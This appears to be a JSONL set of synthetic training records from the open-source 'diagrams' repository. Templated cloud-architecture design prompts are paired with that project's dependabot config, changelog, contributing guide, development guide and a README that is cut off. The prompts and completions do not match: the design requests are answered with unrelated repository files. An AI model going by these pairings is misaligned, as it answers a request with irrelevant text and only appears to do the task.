{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "version: 2\nupdates:\n- package-ecosystem: pip\n  directory: \"/\"\n  schedule:\n    interval: daily\n    time: \"08:00\"\n  open-pull-requests-limit: 10\n- package-ecosystem: npm\n  directory: \"/website\"\n  schedule:\n    interval: daily\n    time: \"08:00\"\n  open-pull-requests-limit: 10\n- package-ecosystem: docker\n  directory: \"/docker/dev\"\n  schedule:\n    interval: daily\n    time: \"08:00\"\n  open-pull-requests-limit: 10\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": ".github/dependabot.yml", "language": "yaml", "complexity": "simple", "star_count": 41221, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 21}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Changelogs\n\n## 0.17.0\n\n### Added\n\n- Support GCP Endpoints: [#259](https://github.com/mingrammer/diagrams/pull/259)\n- Support DroneCI and Atlantis (Terraform): [#255](https://github.com/mingrammer/diagrams/pull/255)\n- Support Okta: [#254](https://github.com/mingrammer/diagrams/pull/254)\n- Support OutScale provider: [#251](https://github.com/mingrammer/diagrams/pull/251)\n- Support Prometheus Operator: [#253](https://github.com/mingrammer/diagrams/pull/253)\n- Support Snowflake: [#245](https://github.com/mingrammer/diagrams/pull/245)\n- Support for CJK fonts + Replace ms-fonts with opensans: [#242](https://github.com/mingrammer/diagrams/pull/242)\n- Support Pushover: [#241](https://github.com/mingrammer/diagrams/pull/241)\n\n### Fixed\n\n- Update bm, vm cases for OCI\n- Set a dummy filename to prevent raise error when both name and filename are not provided: [#240](https://github.com/mingrammer/diagrams/pull/240)\n\n## 0.16.0\n\n### Breaking Changes\n\nThe following import changes:\n\n#### Elastic\n\n| Old import path                                                    | New import path                                               |\n| -------------------------------------------------------------------| --------------------------------------------------------------|\n| `from diagrams.onprem.logging import Logstash`                     | `from diagrams.elastic.elasticsearch import Logstash`         |\n| `from diagrams.onprem.monitoring import Kibana`                    | `from diagrams.elastic.elasticsearch import Kibana`           |\n| `from diagrams.onprem.search import Elasticsearch`                 | `from diagrams.elastic.elasticsearch import Elasticsearch`    |\n\n> About `from diagrams.onprem.search import Elasticsearch` the previous icon was the company icon, not the elasticsearch product.\n>\n> For the company icon use: `from diagrams.elastic.saas import Elastic`\n\n#### OCI\n\n| Old import path                                                    | New import path                                               |\n| -------------------------------------------------------------------| --------------------------------------------------------------|\n| `from diagrams.oci.compute import AutoScale`                       | `from diagrams.oci.compute import Autoscale`                  |\n| `from diagrams.oci.compute import AutoScaleWhite`                  | `from diagrams.oci.compute import AutoscaleWhite`             |\n| `from diagrams.oci.compute import Bm`                              | `from diagrams.oci.compute import BM`                         |\n| `from diagrams.oci.compute import BmWhite`                         | `from diagrams.oci.compute import BMWhite`                    |\n| `from diagrams.oci.compute import Vm`                              | `from diagrams.oci.compute import VM`                         |\n| `from diagrams.oci.compute import VmWhite`                         | `from diagrams.oci.compute import VMWhite`                    |\n| `from diagrams.oci.connectivity import Customerdatacenter`         | `from diagrams.oci.connectivity import CustomerDatacenter`    |\n| `from diagrams.oci.connectivity import CustomerdatacenterWhite`    | `from diagrams.oci.connectivity import CustomerDatacntrWhite` |\n| `from diagrams.oci.connectivity import Customerpremisesequip`      | `from diagrams.oci.connectivity import CustomerPremise`       |\n| `from diagrams.oci.connectivity import CustomerpremisesequipWhite` | `from diagrams.oci.connectivity import CustomerPremiseWhite`  |\n| `from diagrams.oci.connectivity import Fastconnect`                | `from diagrams.oci.connectivity import FastConnect`           |\n| `from diagrams.oci.connectivity import FastconnectWhite`           | `from diagrams.oci.connectivity import FastConnectWhite`      |\n| `from diagrams.oci.connectivity import Vpn`                        | `from diagrams.oci.connectivity import VPN`                   |\n| `from diagrams.oci.connectivity import VpnWhite`                   | `from diagrams.oci.connectivity import VPNWhite`              |\n| `from diagrams.oci.database import AutonomousDatabase`             | `from diagrams.oci.database import Autonomous`                |\n| `from diagrams.oci.database import AutonomousDatabaseWhite`        | `from diagrams.oci.database import AutonomousWhite`           |\n| `from diagrams.oci.database import Databaseservice`                | `from diagrams.oci.database import DatabaseService`           |\n| `from diagrams.oci.database import DatabaseserviceWhite`           | `from diagrams.oci.database import DatabaseServiceWhite`      |\n| `from diagrams.oci.devops import Apigateway`                       | `from diagrams.oci.devops import APIGateway`                  |\n| `from diagrams.oci.devops import ApigatewayWhite`                  | `from diagrams.oci.devops import APIGatewayWhite`             |\n| `from diagrams.oci.devops import Apiservice`                       | `from diagrams.oci.devops import APIService`                  |\n| `from diagrams.oci.devops import ApiserviceWhite`                  | `from diagrams.oci.devops import APIServiceWhite`             |\n| `from diagrams.oci.devops import Resourcemgmt`                     | `from diagrams.oci.devops import ResourceMgmt`                |\n| `from diagrams.oci.devops import ResourcemgmtWhite`                | `from diagrams.oci.devops import ResourceMgmtWhite`           |\n| `from diagrams.oci.edge import Cdn`                                | `from diagrams.oci.connectivity import CDN`                   |\n| `from diagrams.oci.edge import CdnWhite`                           | `from diagrams.oci.connectivity import CDNWhite`              |\n| `from diagrams.oci.edge import Dns`                                | `from diagrams.oci.connectivity import DNS`                   |\n| `from diagrams.oci.edge import DnsWhite`                           | `from diagrams.oci.connectivity import DNSWhite`              |\n| `from diagrams.oci.edge import Emaildelivery`                      | `from diagrams.oci.monitoring import Email`                   |\n| `from diagrams.oci.edge import EmaildeliveryWhite`                 | `from diagrams.oci.monitoring import EmailWhite`              |\n| `from diagrams.oci.edge import Waf`                                | `from diagrams.oci.security import WAF`                       |\n| `from diagrams.oci.edge import WafWhite`                           | `from diagrams.oci.security import WAFWhite`                  |\n| `from diagrams.oci.monitoring import Event`                        | `from diagrams.oci.monitoring import Events`                  |\n| `from diagrams.oci.monitoring import EventWhite`                   | `from diagrams.oci.monitoring import EventsWhite`             |\n| `from diagrams.oci.monitoring import Healthcheck`                  | `from diagrams.oci.monitoring import HealthCheck`             |\n| `from diagrams.oci.monitoring import HealthcheckWhite`             | `from diagrams.oci.monitoring import HealthCheckWhite`        |\n| `from diagrams.oci.monitoring import Logging`                      | `from diagrams.oci.governance import Logging`                 |\n| `from diagrams.oci.monitoring import LoggingWhite`                 | `from diagrams.oci.governance import LoggingWhite`            |\n| `from diagrams.oci.monitoring import Queuing`                      | `from diagrams.oci.monitoring import Queue`                   |\n| `from diagrams.oci.monitoring import QueuingWhite`                 | `from diagrams.oci.monitoring import QueueWhite`              |\n| `from diagrams.oci.network import Internetgateway`                 | `from diagrams.oci.network import InternetGateway`            |\n| `from diagrams.oci.network import InternetgatewayWhite`            | `from diagrams.oci.network import InternetGatewayWhite`       |\n| `from diagrams.oci.network import Loadbalance`                     | `from diagrams.oci.network import LoadBalancer`               |\n| `from diagrams.oci.network import LoadbalanceWhite`                | `from diagrams.oci.network import LoadBalancerWhite`          |\n| `from diagrams.oci.network import NATgateway`                      | `from diagrams.oci.connectivity import NATGateway`            |\n| `from diagrams.oci.network import NATgatewayWhite`                 | `from diagrams.oci.connectivity import NATGatewayWhite`       |\n| `from diagrams.oci.network import Routetable`                      | `from diagrams.oci.network import RouteTable`                 |\n| `from diagrams.oci.network import RoutetableWhite`                 | `from diagrams.oci.network import RouteTableWhite`            |\n| `from diagrams.oci.network import Securitylists`                   | `from diagrams.oci.network import SecurityLists`              |\n| `from diagrams.oci.network import SecuritylistsWhite`              | `from diagrams.oci.network import SecurityListsWhite`         |\n| `from diagrams.oci.network import Vcloudnetwork`                   | `from diagrams.oci.network import Vcn`                        |\n| `from diagrams.oci.network import VcloudnetworkWhite`              | `from diagrams.oci.network import VcnWhite`                   |\n| `from diagrams.oci.security import Audit`                          | `from diagrams.oci.governance import Audit`                   |\n| `from diagrams.oci.security import AuditWhite`                     | `from diagrams.oci.governance import AuditWhite`              |\n| `from diagrams.oci.security import Compartments`                   | `from diagrams.oci.governance import Compartments`            |\n| `from diagrams.oci.security import CompartmentsWhite`              | `from diagrams.oci.governance import CompartmentsWhite`       |\n| `from diagrams.oci.security import Ddos`                           | `from diagrams.oci.security import DDOS`                      |\n| `from diagrams.oci.security import DdosWhite`                      | `from diagrams.oci.security import DDOSWhite`                 |\n| `from diagrams.oci.security import Groups`                         | `from diagrams.oci.governance import Groups`                  |\n| `from diagrams.oci.security import GroupsWhite`                    | `from diagrams.oci.governance import GroupsWhite`             |\n| `from diagrams.oci.security import IdAccess`                       | `from diagrams.oci.security import IDAccess`                  |\n| `from diagrams.oci.security import IdAccessWhite`                  | `from diagrams.oci.security import IDAccessWhite`             |\n| `from diagrams.oci.security import Keymgmt`                        | `from diagrams.oci.security import KeyManagement`             |\n| `from diagrams.oci.security import KeymgmtWhite`                   | `from diagrams.oci.security import KeyManagementWhite`        |\n| `from diagrams.oci.security import Ocid`                           | `from diagrams.oci.governance import OCID`                    |\n| `from diagrams.oci.security import OcidWhite`                      | `from diagrams.oci.governance import OCIDWhite`               |\n| `from diagrams.oci.security import Policies`                       | `from diagrams.oci.governance import Policies`                |\n| `from diagrams.oci.security import PoliciesWhite`                  | `from diagrams.oci.governance import PoliciesWhite`           |\n| `from diagrams.oci.security import Tagging`                        | `from diagrams.oci.governance import Tagging`                 |\n| `from diagrams.oci.security import TaggingWhite`                   | `from diagrams.oci.governance import TaggingWhite`            |\n| `from diagrams.oci.storage import Backuprestore`                   | `from diagrams.oci.storage import BackupRestore`              |\n| `from diagrams.oci.storage import BackuprestoreWhite`              | `from diagrams.oci.storage import BackupRestoreWhite`         |\n| `from diagrams.oci.storage import Blockstorage`                    | `from diagrams.oci.storage import BlockStorage`               |\n| `from diagrams.oci.storage import BlockstorageWhite`               | `from diagrams.oci.storage import BlockStorageWhite`          |\n| `from diagrams.oci.storage import Datatransfer`                    | `from diagrams.oci.storage import DataTransfer`               |\n| `from diagrams.oci.storage import DatatransferWhite`               | `from diagrams.oci.storage import DataTransferWhite`          |\n| `from diagrams.oci.storage import Filestorage`                     | `from diagrams.oci.storage import FileStorage`                |\n| `from diagrams.oci.storage import FilestorageWhite`                | `from diagrams.oci.storage import FileStorageWhite`           |\n| `from diagrams.oci.storage import Objectstorage`                   | `from diagrams.oci.storage import ObjectStorage`              |\n| `from diagrams.oci.storage import ObjectstorageWhite`              | `from diagrams.oci.storage import ObjectStorageWhite`         |\n| `from diagrams.oci.storage import Storagegateway`                  | `from diagrams.oci.storage import StorageGateway`             |\n| `from diagrams.oci.storage import StoragegatewayWhite`             | `from diagrams.oci.storage import StorageGatewayWhite`        |\n\n### Added\n\n- Docker local development setup: [#210](https://github.com/mingrammer/diagrams/pull/210)\n- Support OpenStack [#211](https://github.com/mingrammer/diagrams/pull/211)\n- Support SQL, Druid and Databricks\n- Support Cloudinary: [#218](https://github.com/mingrammer/diagrams/pull/218)\n\n### Fixed\n\n- Clean GCP resources: [#228](https://github.com/mingrammer/diagrams/pull/228)\n- Support DataDog, PaperTrail, Syslog, Rsyslog and Graylog: [#222](https://github.com/mingrammer/diagrams/pull/222)\n- Update all OCI icon set (bark and white): [#205](https://github.com/mingrammer/diagrams/pull/205)\n\n\n## 0.15.0\n\n### Added\n\n- Support curvestyle option (ortho or curved)\n- Support Auth0, Cloudflare and Recombee: [#209](https://github.com/mingrammer/diagrams/pull/209)\n\n### Fixed\n\n- Fix typo for PersistentVolume: [#207](https://github.com/mingrammer/diagrams/pull/207)\n- Fix misaligned label text position\n\n\n## 0.14.0\n\n### Added\n\n- Support sagemaker for AWS provider: [#204](https://github.com/mingrammer/diagrams/pull/204)\n- Support ConcourseCI: [#198](https://github.com/mingrammer/diagrams/pull/198)\n- Support Tekton CLI: [#199](https://github.com/mingrammer/diagrams/pull/199)\n- Support more analytics tools for Onprem provider: [#195](https://github.com/mingrammer/diagrams/pull/195)\n- Support more resources for AWS provider: [#192](https://github.com/mingrammer/diagrams/pull/192)\n- Support kubernetes ecosystem: [#188](https://github.com/mingrammer/diagrams/pull/188)\n- Support Beats for ElasticStack provider: [#153](https://github.com/mingrammer/diagrams/pull/153)\n- Support more icons for Generic provider: [#186](https://github.com/mingrammer/diagrams/pull/186)\n- Support Opsgenie: [#187](https://github.com/mingrammer/diagrams/pull/187)\n- Support Tekton: [#150](https://github.com/mingrammer/diagrams/pull/150)\n- Support Generic provider: [#171](https://github.com/mingrammer/diagrams/pull/171)\n\n\n## 0.13.1\n\n### Fixed\n\n- Add missing firebase base class: [3f400a7](https://github.com/mingrammer/diagrams/commit/3f400a7bc3c91ae9db1f2e69c290bc004c6fa4c6)\n\n\n## 0.13.0\n\n### Added\n\n- Support more DynamoDB and IAM nodes for AWS: [#180](https://github.com/mingrammer/diagrams/pull/180)\n- New provider elastic: [#174](https://github.com/mingrammer/diagrams/pull/174)\n- Support Rust: [#179](https://github.com/mingrammer/diagrams/pull/179)\n- Support Flux and Flagger: [#147](https://github.com/mingrammer/diagrams/pull/147)\n- New provider saas: [#173](https://github.com/mingrammer/diagrams/pull/173)\n- New provider firebase: [#167](https://github.com/mingrammer/diagrams/pull/167)\n- Support ZuulCI: [#145](https://github.com/mingrammer/diagrams/pull/145)\n\n\n## 0.12.0\n\n### Added\n\n- Support GitlabCI: [#166](https://github.com/mingrammer/diagrams/pull/166)\n- Support Sentry: [#165](https://github.com/mingrammer/diagrams/pull/165)\n- Support Couchbase: [#164](https://github.com/mingrammer/diagrams/pull/164)\n- Support new IoT icons, and new Game, General and Robotics categories for AWS: [#161](https://github.com/mingrammer/diagrams/pull/161)\n- Support general icon set for Azure: [#155](https://github.com/mingrammer/diagrams/pull/155)\n- Support Fluent Bit: [#154](https://github.com/mingrammer/diagrams/pull/154)\n- Support integration services for Azure: [#152](https://github.com/mingrammer/diagrams/pull/152)\n- Support custom attribute options for Nodes: [#151](https://github.com/mingrammer/diagrams/pull/151)\n\n\n## 0.11.0\n\n### Added\n\n- Support programming provider (programming languages and frameworks): [#112](https://github.com/mingrammer/diagrams/pull/112)\n- Support NACL, Subnets, Route Table and VPC peering for AWS provider: [#135](https://github.com/mingrammer/diagrams/pull/135)\n- Support Loki: [#139](https://github.com/mingrammer/diagrams/pull/139)\n- Support Tableau and Metabase: [#142](https://github.com/mingrammer/diagrams/pull/142)\n- Support AWS Elemental Services: [#149](https://github.com/mingrammer/diagrams/pull/149)\n\n### Fixed\n\n- Rename Cloudfront to CloudFront: [#129](https://github.com/mingrammer/diagrams/pull/129)\n\n\n## 0.10.0\n\n### Added\n\n- Support red-colored OCI nodes: [#121](https://github.com/mingrammer/diagrams/pull/121)\n- Support custom graph attributes for the Cluster: [6741ed9](https://github.com/mingrammer/diagrams/commit/6741ed9e2bcca297a1044ca5c8f2cf9eb3f8b5b3)\n\n\n## v0.9.0\n\n### Added\n\n- Support Thanos: [#99](https://github.com/mingrammer/diagrams/pull/99)\n- Support AWS VPC Endpoint: [#101](https://github.com/mingrammer/diagrams/pull/101)\n- Support AWS VPC Router: [#102](https://github.com/mingrammer/diagrams/pull/102)\n- Support Teamcity: [#103](https://github.com/mingrammer/diagrams/pull/103)\n- Support Pomerium: [#104](https://github.com/mingrammer/diagrams/pull/104)\n- Support Ansible and AWX: [#110](https://github.com/mingrammer/diagrams/pull/110)\n\n### Fixed\n\n- Replace MD5 Hash with UUID: [#94](https://github.com/mingrammer/diagrams/pull/94)\n- Verify Edge attributes exist before setting: [#96](https://github.com/mingrammer/diagrams/pull/96)\n\n\n## v0.8.2\n\n### Added\n\n- Support Diadag: [#88](https://github.com/mingrammer/diagrams/pull/88)\n- Support Norika and Embulk: [#87](https://github.com/mingrammer/diagrams/pull/87)\n\n\n## v0.8.1\n\n### Added\n\n- Support Celery: [#68](https://github.com/mingrammer/diagrams/pull/68)\n- Support Terraform: [#79](https://github.com/mingrammer/diagrams/pull/79)\n- Support Clickhouse: [#85](https://github.com/mingrammer/diagrams/pull/85)\n\n\n## v0.8.0\n\n### Added\n\n- Support Apache Beam: [#66](https://github.com/mingrammer/diagrams/pull/66)\n- Support PFSense and VyOS: [#67](https://github.com/mingrammer/diagrams/pull/67)\n- Support Polyaxon: [#74](https://github.com/mingrammer/diagrams/pull/74)\n- Support Spinnaker: [#77](https://github.com/mingrammer/diagrams/pull/77)\n- Support Git, GitLab and GitHub of onprem.vcs: [#80](https://github.com/mingrammer/diagrams/pull/80)\n- Support Dgraph, JanusGraph and Scylla of onprem.database: [#84](https://github.com/mingrammer/diagrams/pull/84)\n\n\n## v0.7.4\n\n### Added\n\n- Trivy of onprem.security: [#61](https://github.com/mingrammer/diagrams/pull/61)\n- Cloud IAP (Identity-Aware Proxy) for GCP provider: [#56](https://github.com/mingrammer/diagrams/pull/56), [#43](https://github.com/mingrammer/diagrams/pull/43)\n\n\n## v0.7.3\n\n### Fixed\n\n- Use dynamic keyword attributes for edge init to fix missing attribute\n\n\n## v0.7.2\n\n### Fixed\n\n- Prevent the edge attrs from overwriting by empty string\n- Only use the label for edge\n\n\n## v0.7.0\n\n### Added\n\n- Customer engagement services for AWS: [#57](https://github.com/mingrammer/diagrams/pull/57)\n- Edge attributes support: [#48](https://github.com/mingrammer/diagrams/pull/48)\n\n\n## v0.6.5\n\n### Added\n\n- More on-prem/aws icons: [#55](https://github.com/mingrammer/diagrams/pull/55)\n- Aliases for etcd and haproxy\n\n\n## v0.6.4\n\n### Added\n\n- AWS management resources\n\n### Fixed\n\n- Update OCI icon set: [#46](https://github.com/mingrammer/diagrams/pull/46)\n\n\n## v0.6.3\n\n### Added\n\n- Support inline rendering for jupyter notebook\n\n\n## v0.6.2\n\n### Fixed\n\n- Support multi-line labels\n\n\n## v0.6.1\n\n### Added\n\n- Aliases for activemq (ActiveMQ) / rabbitmq (RabbitMQ)\n\n\n## v0.6.0\n\n### Added\n\n- Support custom nodes: [#25](https://github.com/mingrammer/diagrams/pull/25)\n- Allow an output filename to be passed to Diagram explicitly: [#28](https://github.com/mingrammer/diagrams/pull/28)\n- Support on-premise nodes: [#35](https://github.com/mingrammer/diagrams/pull/35)\n\n\n## v0.5.0\n\n### Added\n\n- Oracle Cloud provider support: [#20](https://github.com/mingrammer/diagrams/pull/20)\n\n\n## v0.4.0\n\n### Added\n\n- Alibaba Cloud provider support: [#19](https://github.com/mingrammer/diagrams/pull/19)\n\n\n## v0.3.0\n\n### Added\n\n- Allow custom dot attributes: [#11](https://github.com/mingrammer/diagrams/pull/11)\n\n### Fixed\n\n- Support Python 3.6: [#13](https://github.com/mingrammer/diagrams/pull/13)\n\n\n## v0.2.3\n\n### Fixed\n\n- Fix misaligned node labels by removing backward-incompatible 'imagepos' attribute: [#7](https://github.com/mingrammer/diagrams/pull/7)\n\n\n## v0.2.1\n\n### Added\n\n- Add more AWS analytics services: [870b387](https://github.com/mingrammer/diagrams/commit/870b387ded41cb6591b8bdfd3994e5719d8b9969)\n\n\n## v0.2.0\n\n### Added\n\n- Support kubernetes diagrams: [3eda1cb](https://github.com/mingrammer/diagrams/commit/3eda1cb6bca8be8a55773d90b93483a8fab3e0f1)\n\n\n## v0.23.5\n\n### Breaking Changes\n\nThe following import changes:\n\n#### OCI\n\n| Old import path                                                    | New import path                                               |\n| -------------------------------------------------------------------| --------------------------------------------------------------|\n| `from diagrams.oci.connectivity import CustomerPremiseWhite`       | `from diagrams.oci.connectivity import CustomerPremisesWhite` |\n| `from diagrams.oci.connectivity import CustomerPremises`           | `from diagrams.oci.connectivity import CustomerPremises`      |\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "CHANGELOG.md", "language": "markdown", "complexity": "complex", "star_count": 41221, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 411}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Contribution Guide\n\nYou shouldn't edit the node class files (all files under `diagrams/` directory) by\nyourself.\n\n## Set up your environment\n\n- See [DEVELOPMENT][DEVELOPMENT.md]\n\n## Resources\n\n### Update nodes\n\nAll node classes are auto-generated from image resource files. For example, the\n`diagram.aws.compute.EC2` class is auto-generated based on the\n`resources/aws/compute/ec2.png` image resource file.\n\nSo, if you want to add new node resources or update existing node resources, you\ncan just add or update the image files in `resources/<provider>/<type>/<image>`.\n\nImages should be resized to fit a maximum of 256 pixels wide or high.\n\n```shell\n# You can do that easily with ImageMagick\nconvert -resize 256 my_big_image.jpg my_image.jpg\n\n# Or FFmpeg\nffmpeg -i my_big_image.jpg -vf scale=w=256:h=256:force_original_aspect_ratio=decrease my_image.png\n```\n\nThen just run the `./autogen.sh` to generate the added or updated node classes. (cf. [DEVELOPMENT][DEVELOPMENT.md])\n\n> IMPORTANT NOTE: To run `autogen.sh`, you need the [round][round], [black][black] and\n> [inkscape][inkscape] command line tools that are used for cleaning the image\n> resource filenames and formatting the generated python code.\n>\n> macOS users can download inkscape via Homebrew.\n>\n> Or you can use the docker image.\n\n[DEVELOPMENT.md]: ./DEVELOPMENT.md\n[round]: https://github.com/mingrammer/round\n[black]: https://pypi.org/project/black\n[inkscape]: https://inkscape.org/ko/release\n\n### Add new provider\n\nTo add a new provider to Diagrams, please follow the steps below in addition to the image intructions above:\n- in `autogen.sh` add in the `providers` variable the new provider code\n- in `config.py`:\n  - in the `providers` variable, add the new provider code\n  - in the `FILE_PREFIXES` variable, add a new entry with your new provider code. And eventually a file prefix\n  - Optionnaly, update the `UPPER_WORDS` variable to a new entry with your new provider code.\n  - in the `ALIASES` variable, add a new entry with your new provider code. See below on how to add new aliases.\n- in `scripts/resource.py`:\n  - add a function `cleaner_XXX` (replace XXX by your provider name). For the implementation look at the existing functions\n  - in the `cleaners` variable, add an entry with your new provider code and the function defined above\n- in `sidebars.json`, update the `Nodes` array to add the reference of the new provider\n- in the `diagrams` folder, add a new file `__init__.py` for the new provider. For the content look at the existing providers\n\n### Update Aliases\n\nSome node classes have alias. For example, `aws.compute.ECS` class is an alias\nof `aws.compute.ElasticContainerService` class. Aliases also were auto-generated\nfrom `ALIASES` map in [config.py](config.py).\n\nSo, if you want to add new aliases or update existing aliases, you can just add\nor update the `ALIASES` map in [config.py](config.py).\n\nThen just run the `./autogen.sh` to generate the added or updated aliases. (cf. [DEVELOPMENT][DEVELOPMENT.md])\n\n> IMPORTANT NOTE: To run `autogen.sh`, you need the [round][round] and\n> [inkscape][inkscape] command line tools that are used for cleaning the image\n> resource filenames.\n>\n> macOS users can download inkscape via Homebrew.\n>\n> Or you can use the docker image.\n\n## Run Tests\n\n```shell\npython -m unittest tests/*.py -v\n```\n\n## Testing changes to the website\n\nThe [Docusaurus](https://docusaurus.io/)-based documentation website can be run by installing dependencies, then simply running `npm run start`.\n\n```bash\ncd website/\nnpm i\nnpm run start\n```\n\nThe website will be available on [http://localhost:3000](http://localhost:3000).\n\nEdit files in `website/` and `docs/` respectively to edit documentation.\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "CONTRIBUTING.md", "language": "markdown", "complexity": "simple", "star_count": 41221, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 99}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Development Guide\n\n## Docker local development setup\n\nYou should have docker installed in your system, if not click [here](https://docs.docker.com/get-docker/).\n\n1. Go to diagrams root directory.\n\n2. Build the docker image.\n\n    ```shell\n    docker build --tag diagrams:1.0 -f ./docker/dev/Dockerfile .\n    ```\n\n3. Create the container, run in background and mount the project source code.\n\n    ```shell\n    docker run -d \\\n    -it \\\n    --name diagrams \\\n    --mount type=bind,source=\"$(pwd)\",target=/usr/src/diagrams \\\n    diagrams:1.0\n    ```\n\n4. Run unit tests in the host using the container to confirm that it's working.\n\n    ```shell\n    docker exec diagrams python -m unittest tests/*.py -v\n    ```\n\n5. Run the bash script `autogen.sh` to test.\n\n    ```shell\n    docker exec diagrams ./autogen.sh\n    ```\n\n6. If the unit tests and the bash script `autogen.sh` is working correctly, then your system is now ready for development.\n\n\n## Mac local development setup\n\nTo be able to develop and run diagrams locally on you Mac device, you should have [Python](https://www.python.org/downloads/), [Go](https://golang.org/doc/install), and [brew](https://brew.sh/) installed on your system.\n\n1. Go to diagrams root directory.\n\n2. Install poetry, the Python project management package used by diagrams.\n\n    ```shell\n    pip install poetry\n    ```\n\n3. Install the project's Python dependencies.\n\n    ```shell\n    poetry install\n    ```\n\n4. Install diagrams binary dependencies.\n\n    ```shell\n    brew install imagemagick inkscape black\n    go install github.com/mingrammer/round@latest\n    # ln -sf ~/go/bin/round ~/.local/bin/round\n    ```\n\n5. Run unit tests to confirm that it's working.\n\n    ```shell\n    python -m unittest tests/*.py -v\n    ```\n\n6. Run the bash script `autogen.sh` to test.\n\n    ```shell\n    ./autogen.sh\n    ```\n\n7. If the unit tests and the bash script `autogen.sh` is working correctly, then your system is now ready for development.\n", "metadata": {"source": "github.com/mingrammer/diagrams", "file_path": "DEVELOPMENT.md", "language": "markdown", "complexity": "simple", "star_count": 41221, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": true, "line_count": 79}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "![diagrams logo](assets/img/diagrams.png)\n\n# Diagrams\n\n[![license](https://img.shields.io/badge/license-MIT-blue.svg)](/LICENSE)\n[![pypi version](https://badge.fury.io/py/diagrams.svg)](https://badge.fury.io/py/diagrams)\n![python version](https://img.shields.io/badge/python-%3E%3D%203.9-blue?logo=python)\n![Run tests](https://github.com/mingrammer/diagrams/workflows/Run%20tests/badge.svg?branch=master)\n[![todos](https://badgen.net/https/api.tickgit.com/badgen/github.com/mingrammer/diagrams?label=todos)](https://www.tickgit.com/browse?repo=github.com/mingrammer/diagrams)\n![contributors](https://img.shields.io/github/contributors/mingrammer/diagrams)\n\n<a href=\"https://www.buymeacoffee.com/mingrammer\" target=\"_blank\"><img src=\"https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png\" alt=\"Buy Me A Coffee\" style=\"height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;\" ></a>\n\n**Diagram as Code**.\n\nDiagrams lets you draw the cloud system architecture **in Python code**. It was born for **prototyping** a new system architecture design without any design tools. You can also describe or visualize the existing system architecture as well. Diagrams currently supports main major providers including: `AWS`, `Azure`, `GCP`, `Kubernetes`, `Alibaba Cloud`, `Oracle Cloud` etc... It also supports `On-Premises` nodes, `SaaS` and major `Programming` frameworks and languages.\n\n**Diagram as Code** also allows you to **track** the architecture diagram changes in any **version control** system.\n\n>  NOTE: It does not control any actual cloud resources nor does it generate cloud formation or terraform code. It is just for drawing the cloud system architecture diagrams.\n\n## Providers\n\n![aws provider](https://img.shields.io/badge/AWS-orange?logo=amazon-aws&color=ff9900)\n![azure provider](https://img.shields.io/badge/Azure-orange?logo=microsoft-azure&color=0089d6)\n![gcp provider](https://img.shields.io/badge/GCP-orange?logo=google-cloud&color=4285f4)\n![ibm provider](https://img.shields.io/badge/IBM-orange?logo=ibm&color=052FAD)\n![kubernetes provider](https://img.shields.io/badge/Kubernetes-orange?logo=kubernetes&color=326ce5)\n![alibaba cloud provider](https://img.shields.io/badge/AlibabaCloud-orange?logo=alibaba-cloud&color=ff6a00)\n![oracle cloud provider](https://img.shields.io/badge/OracleCloud-orange?logo=oracle&color=f80000)\n![openstack provider](https://img.shields.io/badge/OpenStack-orange?logo=openstack&color=da1a32)\n![firebase provider](https://img.shields.io/badge/Firebase-orange?logo=firebase&color=FFCA28)\n![digital ocean provider](https://img.shields.io/badge/DigitalOcean-0080ff?logo=digitalocean&color=0080ff)\n![elastic provider](https://img.shields.io/badge/Elastic-orange?logo=elastic&color=005571)\n![outscale provider](https://img.shields.io/badge/OutScale-orange?color=5f87bf)\n![on premises provider](https://img.shields.io/badge/OnPremises-orange?color=5f87bf)\n![generic 